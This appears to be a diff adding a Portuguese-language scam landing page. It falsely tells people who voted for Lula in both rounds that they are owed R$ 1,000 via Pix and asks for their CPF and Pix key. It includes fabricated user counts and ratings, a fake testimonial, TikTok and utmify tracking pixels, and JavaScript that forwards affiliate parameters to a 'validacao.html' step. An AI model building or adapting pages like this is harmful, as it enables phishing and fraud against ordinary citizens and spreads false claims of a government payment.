@@ -1,0 +1,536 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="download_date" content="2026-10-26T03:15:57.635Z"/>
+    <script type="text/javascript" async="" src="js/events.js"></script><script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+  window.googlePixelId = "69b62d3b4502409dfd94d252";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel-google.js"></script>
+
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D7O198RC77U44OJIMST0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resgate de Benefício - R$ 1.000,00</title>
+    <script src="../_external/cdn.tailwindcss.com/index.js"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="../_external/fonts.googleapis.com/css2.family_Poppins_wght_400_500_600_700_display_swap.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f8f9fa;
+        }
+        
+        /* Animações */
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
+            }
+            70% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 10px rgba(34, 197, 94, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(34, 197, 94, 0);
+            }
+        }
+        
+        .btn-pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-shine:after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.3) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { left: -100%; opacity: 0; }
+            50% { left: 100%; opacity: 1; }
+            100% { left: 100%; opacity: 0; }
+        }
+        
+        /* Cards */
+        .card {
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            border-radius: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+            transform: translateY(-2px);
+        }
+        
+        /* Ícones */
+        .icon-circle {
+            width: 48px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        /* Carrossel */
+        .carousel-item {
+            display: none;
+        }
+        
+        .carousel-item.active {
+            display: block;
+        }
+        
+        .carousel-img {
+            max-width: 100%;
+            height: 280px;
+            object-fit: cover;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Steps */
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            border: 2px solid #e5e5e5;
+            color: #999;
+            background: white;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .step.active {
+            border-color: #16a34a;
+            background: #16a34a;
+            color: #ffffff;
+        }
+        
+        .step-line {
+            flex: 1;
+            height: 3px;
+            background: #e5e5e5;
+            margin: 0 10px;
+        }
+        
+        .step-line.active {
+            background: #16a34a;
+        }
+        
+        /* Responsividade */
+        @media (max-width: 480px) {
+            .carousel-img {
+                height: 240px;
+            }
+            
+            .icon-circle {
+                width: 44px;
+                height: 44px;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <div class="max-w-md mx-auto min-h-screen bg-white relative">
+        
+        <!-- Header -->
+        <header class="flex items-center justify-between p-4 bg-white border-b border-gray-100">
+            <button class="text-gray-600 text-2xl">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+            <div class="flex items-center">
+                <img src="images/logonova.webp" alt="Logo" class="h-12">
+                <span class="ml-2 text-xl font-bold text-gray-800">Consulta de Benefício</span>
+            </div>
+            <div class="w-8"></div>
+        </header>
+        
+        <!-- Hero Section -->
+        <div class="relative">
+           <img src="images/Chat-GPT-Image-6-de-ago-de-2026-14-12-30.jfif" alt="Consulta de Benefício" class="w-full h-64 object-cover">
+        </div>
+        
+        <!-- Card Principal com Contexto -->
+        <div class="px-4 -mt-8 relative z-10">
+            <div class="bg-white card p-6">
+                <h1 class="text-xl font-bold text-gray-900 mb-2 text-center leading-tight">
+                    Votou no Lula nos dois turnos?
+                </h1>
+                <p class="text-lg font-semibold text-green-600 mb-6 text-center">
+                    Você tem direito a R$ 1.000,00!
+                </p>
+                
+                <div class="space-y-4">
+                    <div class="flex items-center bg-green-50 p-4 rounded-xl">
+                        <div class="bg-green-600 text-white icon-circle mr-4">
+                            <i class="fas fa-money-bill-wave text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Pagamento via Pix</h3>
+                            <p class="text-sm text-gray-600">Receba 1000 diretamente na sua conta.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="flex items-center bg-blue-50 p-4 rounded-xl">
+                        <div class="bg-blue-600 text-white icon-circle mr-4">
+                            <i class="fas fa-check-circle text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Consulta Imediata</h3>
+                            <p class="text-sm text-gray-600">Validação simples através do seu CPF.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="flex items-center bg-emerald-50 p-4 rounded-xl">
+                        <div class="bg-emerald-600 text-white icon-circle mr-4">
+                            <i class="fas fa-shield-alt text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Transferência Rápida</h3>
+                            <p class="text-sm text-gray-600">Após a confirmação, o saldo é liberado.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Botão Principal -->
+                <button id="btnSolicitar" class="w-full bg-green-600 hover:bg-green-700 text-white text-lg font-bold py-4 rounded-xl mt-6 btn-pulse btn-shine transition-all duration-300">
+                    Consultar meus R$ 1.000 agora
+                </button>
+                
+                <!-- Segurança -->
+                <div class="flex items-center justify-center mt-4 pt-4 border-t border-gray-100 text-gray-600">
+                    <i class="fas fa-lock mr-2 text-green-600"></i>
+                    <span class="text-sm">Seus dados estão protegidos e seguros</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Como Funciona o Resgate -->
+        <div class="px-4 mt-6">
+            <div class="bg-white card p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Como Funciona o Resgate?</h2>
+                
+                <!-- Steps -->
+                <div class="flex items-center justify-between mb-6">
+                    <div class="step active">1</div>
+                    <div class="step-line active"></div>
+                    <div class="step">2</div>
+                    <div class="step-line"></div>
+                    <div class="step">3</div>
+                </div>
+                
+                <!-- Carrossel -->
+                <div class="relative">
+                    <div class="carousel-item active">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-xl p-4 mb-4">
+                                <img src="images/1.jpg" alt="Etapa 1" class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">1.</span> Digite seu CPF para consultar a elegibilidade do benefício
+                            </p>
+                        </div>
+                    </div>
+                    
+                    <div class="carousel-item">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-xl p-4 mb-4">
+                                <img src="images/2.jpg" alt="Etapa 2" class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">2.</span> Confirme seus dados e informe a sua chave Pix
+                            </p>
+                        </div>
+                    </div>
+                    
+                    <div class="carousel-item">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-xl p-4 mb-4">
+                                <img src="images/3.jpg" alt="Etapa 3" class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">3.</span> Receba os R$ 1.000 diretamente na sua conta
+                            </p>
+                        </div>
+                    </div>
+                    
+                    <!-- Navegação do carrossel -->
+                    <button id="prevBtn" class="absolute left-2 top-1/2 transform -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-green-600 hover:bg-green-50">
+                        <i class="fas fa-chevron-left"></i>
+                    </button>
+                    <button id="nextBtn" class="absolute right-2 top-1/2 transform -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-green-600 hover:bg-green-50">
+                        <i class="fas fa-chevron-right"></i>
+                    </button>
+                </div>
+                
+                <!-- Indicadores -->
+                <div class="flex justify-center mt-4 space-x-2">
+                    <div class="w-2 h-2 rounded-full bg-green-600" data-indicator="0"></div>
+                    <div class="w-2 h-2 rounded-full bg-gray-300" data-indicator="1"></div>
+                    <div class="w-2 h-2 rounded-full bg-gray-300" data-indicator="2"></div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Estatísticas -->
+        <div class="px-4 mt-6">
+            <div class="bg-white card p-6 flex justify-between text-center">
+                <div>
+                    <p class="text-2xl font-bold text-gray-800">+500mil</p>
+                    <p class="text-xs text-gray-600">Beneficiados</p>
+                </div>
+                <div>
+                    <p class="text-2xl font-bold text-gray-800">4.9/5</p>
+                    <p class="text-xs text-gray-600">Satisfação</p>
+                </div>
+                <div>
+                    <p class="text-2xl font-bold text-gray-800">1 min</p>
+                    <p class="text-xs text-gray-600">Transferência</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Ver Limite / Elegibilidade -->
+        <div class="px-4 mt-6">
+            <button id="btnVerLimite" class="bg-white card p-4 w-full flex items-center justify-between">
+                <div class="flex items-center">
+                    <div class="bg-gray-100 icon-circle mr-3">
+                        <i class="fas fa-search text-green-600"></i>
+                    </div>
+                    <div class="text-left">
+                        <p class="font-semibold text-gray-800">Ver Status do Resgate</p>
+                        <p class="text-sm text-gray-600">Confirme se o seu valor já está liberado</p>
+                    </div>
+                </div>
+                <i class="fas fa-chevron-right text-green-600"></i>
+            </button>
+        </div>
+        
+        <!-- Depoimentos -->
+        <div class="px-4 mt-6 mb-8">
+            <div class="bg-white card p-6">
+                <div class="flex items-center mb-4">
+                    <div class="bg-green-100 rounded-full p-2 mr-3">
+                        <i class="fas fa-quote-right text-green-600"></i>
+                    </div>
+                    <p class="font-semibold text-gray-800">Depoimentos de quem já recebeu</p>
+                </div>
+                
+                <div class="border-l-4 border-green-500 pl-4">
+                    <p class="text-gray-700 italic mb-2">
+                        "Fiz a consulta no CPF, confirmei meus dados e o valor de R$ 1.000 caiu direto na minha conta Pix na hora!"
+                    </p>
+                    <div class="flex items-center">
+                        <p class="text-sm font-semibold text-gray-800 mr-2">Mariana S.</p>
+                        <div class="flex text-yellow-400">
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Carrossel
+        let currentStep = 0;
+        const maxSteps = 3;
+        const carouselItems = document.querySelectorAll('.carousel-item');
+        const indicators = document.querySelectorAll('[data-indicator]');
+        
+        function updateCarousel(stepIndex) {
+            carouselItems.forEach((item, index) => {
+                item.classList.toggle('active', index === stepIndex);
+            });
+            
+            indicators.forEach((indicator, index) => {
+                indicator.classList.toggle('bg-green-600', index === stepIndex);
+                indicator.classList.toggle('bg-gray-300', index !== stepIndex);
+            });
+        }
+        
+        function nextStep() {
+            currentStep = (currentStep + 1) % maxSteps;
+            updateCarousel(currentStep);
+        }
+        
+        function prevStep() {
+            currentStep = (currentStep - 1 + maxSteps) % maxSteps;
+            updateCarousel(currentStep);
+        }
+        
+        // Captura de parâmetros
+        function captureUrlParameters() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const params = {};
+            
+            for (const [key, value] of urlParams.entries()) {
+                params[key] = value;
+            }
+            
+            const searchString = window.location.search;
+            if (searchString) {
+                const pairs = searchString.substring(1).split('&');
+                pairs.forEach(pair => {
+                    const [key, value = ''] = pair.split('=');
+                    if (key && !params.hasOwnProperty(key)) {
+                        params[key] = decodeURIComponent(value);
+                    }
+                });
+            }
+            
+            localStorage.setItem('urlParams', JSON.stringify(params));
+            return params;
+        }
+        
+        function getSavedParameters() {
+            const savedParams = localStorage.getItem('urlParams');
+            return savedParams ? JSON.parse(savedParams) : {};
+        }
+        
+        function buildUrlWithParams(baseUrl) {
+            const currentUrlParams = new URLSearchParams(window.location.search);
+            const savedParams = getSavedParameters();
+            const queryParams = new URLSearchParams();
+            
+            const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'sck'];
+            
+            const allParams = {};
+            
+            for (const [key, value] of currentUrlParams.entries()) {
+                allParams[key] = value;
+            }
+            
+            for (const [key, value] of Object.entries(savedParams)) {
+                if (!allParams.hasOwnProperty(key)) {
+                    allParams[key] = value;
+                }
+            }
+            
+            for (const [key, value] of Object.entries(allParams)) {
+                if (utmParams.includes(key) || value) {
+                    queryParams.append(key, value || '');
+                }
+            }
+            
+            const queryString = queryParams.toString();
+            return queryString ? `${baseUrl}?${queryString}` : baseUrl;
+        }
+        
+        function redirectToNextPage() {
+            const nextPageUrl = buildUrlWithParams('validacao.html');
+            
+            if (typeof gtag !== 'undefined') {
+                gtag('event', 'solicitar_cartao_click', {
+                    page: 'landing',
+                    ...getSavedParameters()
+                });
+            }
+            
+            setTimeout(() => {
+                window.location.href = nextPageUrl;
+            }, 100);
+        }
+        
+        // Inicialização
+        document.addEventListener('DOMContentLoaded', function() {
+            captureUrlParameters();
+            
+            // Carrossel
+            document.getElementById('nextBtn').addEventListener('click', nextStep);
+            document.getElementById('prevBtn').addEventListener('click', prevStep);
+            
+            // Auto-play
+            let autoPlay = setInterval(nextStep, 5000);
+            
+            [document.getElementById('prevBtn'), document.getElementById('nextBtn')].forEach(btn => {
+                btn.addEventListener('click', () => {
+                    clearInterval(autoPlay);
+                    setTimeout(() => {
+                        autoPlay = setInterval(nextStep, 5000);
+                    }, 10000);
+                });
+            });
+            
+            // Botões
+            document.getElementById('btnSolicitar').addEventListener('click', function(e) {
+                e.preventDefault();
+                redirectToNextPage();
+            });
+            
+            document.getElementById('btnVerLimite').addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                if (typeof gtag !== 'undefined') {
+                    gtag('event', 'ver_limite_click', {
+                        page: 'landing',
+                        ...getSavedParameters()
+                    });
+                }
+                
+                setTimeout(() => {
+                    window.location.href = buildUrlWithParams('2.html');
+                }, 100);
+            });
+            
+            // Indicadores clicáveis
+            indicators.forEach((indicator, index) => {
+                indicator.addEventListener('click', () => {
+                    currentStep = index;
+                    updateCarousel(currentStep);
+                    clearInterval(autoPlay);
+                });
+            });
+            
+            // Tracking
+            if (typeof gtag !== 'undefined') {
+                gtag('event', 'page_view', {
+                    page: 'landing',
+                    ...getSavedParameters()
+                });
+            }
+        });
+    </script>
+
+</body>
